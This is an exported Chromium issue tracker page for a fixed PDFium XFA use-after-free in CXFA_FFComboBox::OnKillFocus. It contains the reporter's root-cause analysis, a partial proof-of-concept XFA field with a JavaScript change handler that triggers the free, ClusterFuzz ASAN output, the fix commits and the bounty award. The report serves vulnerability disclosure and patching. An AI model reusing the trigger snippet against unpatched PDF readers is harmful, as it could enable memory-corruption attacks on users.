# Security: PDFium (XFA) Use-after-free in CXFA_FFComboBox::OnKillFocus

| Field | Value |
|-------|-------|
| **Issue ID** | [40096013](https://issues.chromium.org/issues/40096013) |
| **Status** | Accepted |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | my...@gmail.com |
| **Assignee** | ts...@chromium.org |
| **Created** | 2019-08-18 |
| **Bounty** | $5,000.00 |

## Description

Steps to reproduce the problem:
1. Compile the latest chromium with enabled XFA PDFium
2. Open file test.pdf with chrome


What is the expected behavior?

What went wrong?
CXFA_FFWidget object use-after-free in function CXFA_FFComboBox::OnKillFocus

Did this work before? N/A 

Chrome version: Lasted  Channel: n/a
OS Version: Windows 10 
Flash Version:

The bug is in CXFA_FFComboBox::OnKillFocus() function

bool CXFA_FFComboBox::OnKillFocus(CXFA_FFWidget* pNewWidget) {
  if (!ProcessCommittedData())
    UpdateFWLData();

  return CXFA_FFField::OnKillFocus(pNewWidget);
}

Function UpdateFWLData() can trigger to JS code by setting an 'change' event to field. Like in proof-of-concept file, i have a 'choiceList' field like this

<field name="choiceList1" h="10mm" w="30mm" x="5mm" y="50mm" access="readOnly">
    <ui>
		<choiceList/>
    </ui>
    <items>
		<text>pdfium</text>
    </items>
    <value>
        <text>pdfium</text>
    </value>
	<event activity="change">
		<script contentType="application/x-javascript">
			change_count += 1;
			if (change_count == 2)
			{
				choiceList0 = xfa.resolveNode("xfa.form..choiceList0");
				xfa.host.setFocus(choiceList0);
				subform3 = xfa.resolveNode("xfa.form..subform3");
				subform3.instanceManager.addInstance(1);
				subform3.instanceManager.removeInstance(0);
				xfa.host.openList(choiceList0);
			}
		</script>
	</event>
</field>

JS code in 'change' event will be executed when function and it'll free the object |pNewWidget|. After JS event handler, it's back to function CXFA_FFComboBox::OnKillFocus(), the object |pNewWidget| will be used again in function CXFA_FFField::OnKillFocus() => use-after-free bug!

## Attachments

- [test.pdf](attachments/test.pdf) (application/pdf, 8.3 KB)
- [log.txt](attachments/log.txt) (text/plain, 29.6 KB)

## Timeline

### cl...@chromium.org (2019-08-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4868478218928128.

### cl...@chromium.org (2019-08-19)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5971127790075904.

### cl...@chromium.org (2019-08-19)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-08-19)

Testcase 4868478218928128 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=4868478218928128.

### cl...@chromium.org (2019-08-19)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Internals>Plugins>PDF]

### cl...@chromium.org (2019-08-19)

Automatically adding ccs based on suspected regression changelists:

Observe pNewWidget across OnKillFocus by tsepez@chromium.org - https://pdfium.googlesource.com/pdfium/+/b9c940d699f6f893efe6a8a479b2b7934cde4b02

Observe m_pFocusWidget across m_ArrayKeepItems.clear() by tsepez@chromium.org - https://pdfium.googlesource.com/pdfium/+/931dd1b56c0398258c68500fff04f04330bde73b

If this is incorrect, please let us know why and apply the Test-Predator-Wrong-CLs label.

### cl...@chromium.org (2019-08-19)

Detailed Report: https://clusterfuzz.com/testcase?key=5971127790075904

Fuzzing Engine: libFuzzer
Fuzz Target: pdfium_xfa_fuzzer
Job Type: libfuzzer_chrome_asan
Platform Id: linux

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x61100000c4d0
Crash State:
  fxcrt::Observable::AddObserver
  CXFA_FFWidget::OnKillFocus
  CXFA_FFField::OnKillFocus
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=libfuzzer_chrome_asan&range=687457:687463

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5971127790075904

See https://github.com/google/clusterfuzz-tools for instructions to reproduce this bug locally.

A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### th...@chromium.org (2019-08-19)

XFA -> not shipped -> Impact = None.

### th...@chromium.org (2019-08-19)

[Empty comment from Monorail migration]

### th...@chromium.org (2019-08-20)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-09-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-10-17)

Automatically adding ccs based on OWNERS file / target commit history.

If this is incorrect, please add the ClusterFuzz-Wrong label.

### my...@gmail.com (2020-01-06)

Hi, I've just noticed that on recent patch, you fixed this bug.
https://pdfium-review.googlesource.com/c/pdfium/+/64531
As I can see, the bug ID is far behind from this issue. May I ask if you can reward based on the knowledge I've found several months ago so we can close this issue?

### ts...@chromium.org (2020-01-06)

[Empty comment from Monorail migration]

### ts...@chromium.org (2020-01-06)

Yep,  earliest report takes precedence.  Thanks for pointing this out.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-01-07)

The following revision refers to this bug:
  https://pdfium.googlesource.com/pdfium/+/5131f71d63052ca851f6a78830d2da564be50f44

commit 5131f71d63052ca851f6a78830d2da564be50f44
Author: Tom Sepez <tsepez@chromium.org>
Date: Tue Jan 07 23:22:48 2020

Observe CXFA_FFWidget across UpdateFWLData() calls.

It may reenter JS and mutate the page.

Bug: chromium:1038000, chromium:995081
Change-Id: I14a4fdb7e4f6a499c9713bfe02f1cda2d3b5e32e
Reviewed-on: https://pdfium-review.googlesource.com/c/pdfium/+/64531
Reviewed-by: Lei Zhang <thestig@chromium.org>
Commit-Queue: Tom Sepez <tsepez@chromium.org>

[modify] https://pdfium.googlesource.com/pdfium/+/5131f71d63052ca851f6a78830d2da564be50f44/xfa/fxfa/cxfa_fflistbox.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/5131f71d63052ca851f6a78830d2da564be50f44/xfa/fxfa/cxfa_fffield.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/5131f71d63052ca851f6a78830d2da564be50f44/xfa/fxfa/cxfa_ffdocview.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/5131f71d63052ca851f6a78830d2da564be50f44/xfa/fxfa/cxfa_fftextedit.cpp
[modify] https://pdfium.googlesource.com/pdfium/+/5131f71d63052ca851f6a78830d2da564be50f44/xfa/fxfa/cxfa_ffcombobox.cpp


### ts...@chromium.org (2020-01-07)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/8f12c7dbef74572caeb7ee8baee3187633902930

commit 8f12c7dbef74572caeb7ee8baee3187633902930
Author: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Date: Wed Jan 08 06:03:49 2020

Roll src/third_party/pdfium 7d0916bb7588..e83d8b4f0dd4 (12 commits)

https://pdfium.googlesource.com/pdfium.git/+log/7d0916bb7588..e83d8b4f0dd4

git log 7d0916bb7588..e83d8b4f0dd4 --date=short --first-parent --format='%ad %ae %s'
2020-01-08 dhoss@chromium.org Add FPDFTextObj_SetTextRenderMode() to public API
2020-01-08 tsepez@chromium.org CHECK() that content layout item lists do not get tangled.
2020-01-08 tsepez@chromium.org Observe destruction of CXFA_FFComboBox across FWL events
2020-01-07 tsepez@chromium.org Remove duplicate SetLayoutItem(nullptr) in CXFA_ContentLayoutItem
2020-01-07 tsepez@chromium.org Move CFX_Barcode from fwl/ to fxbarcode/
2020-01-07 tsepez@chromium.org Observe CXFA_FFWidget across UpdateFWLData() calls.
2020-01-07 tsepez@chromium.org Use CXFA_FFWidget::GetAppProvider() helper method.
2020-01-07 thestig@chromium.org Run tests with --disable-javascript in coverage_report.py.
2020-01-07 tsepez@chromium.org Stop holding CXFA_FFDocView::m_pFocusWidget in local variables.
2020-01-07 tsepez@chromium.org Re-enable CXFALayoutItemEmbedderTest.Bug_306123
2020-01-07 tsepez@chromium.org Cover FPDF_RemoveFormFieldHighlight() from embedder tests.
2020-01-07 tsepez@chromium.org Add embedder test for FPDFBitmap_CreateEx().

Created with:
  gclient setdep -r src/third_party/pdfium@e83d8b4f0dd4

If this roll has caused a breakage, revert this CL and stop the roller
using the controls here:
https://autoroll.skia.org/r/pdfium-autoroll
Please CC pdfium-deps-rolls@chromium.org on the revert to ensure that a human
is aware of the problem.

To report a problem with the AutoRoller itself, please file a bug:
https://bugs.chromium.org/p/skia/issues/entry?template=Autoroller+Bug

Documentation for the AutoRoller is here:
https://skia.googlesource.com/buildbot/+/master/autoroll/README.md

Bug: chromium:1037981,chromium:1038000,chromium:1039629,chromium:306123,chromium:995081
Tbr: pdfium-deps-rolls@chromium.org
Change-Id: Ife0b7561bab1b37460c4e30d801e51f7c754ebc0
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1990582
Reviewed-by: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com>
Cr-Commit-Position: refs/heads/master@{#729242}

[modify] https://crrev.com/8f12c7dbef74572caeb7ee8baee3187633902930/DEPS


### sh...@chromium.org (2020-01-08)

[Empty comment from Monorail migration]

### cl...@chromium.org (2020-01-08)

ClusterFuzz testcase 4762872529879040 is verified as fixed in https://clusterfuzz.com/revisions?job=libfuzzer_chrome_asan&range=729241:729242

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### na...@google.com (2020-01-14)

[Empty comment from Monorail migration]

### na...@google.com (2020-01-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-01-23)

Congrats the Panel decided to reward $5,000 for this report!

### na...@google.com (2020-01-23)

[Empty comment from Monorail migration]

### th...@chromium.org (2020-02-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2020-04-15)

This issue was migrated from crbug.com/chromium/995081?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1038000]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40096013)*
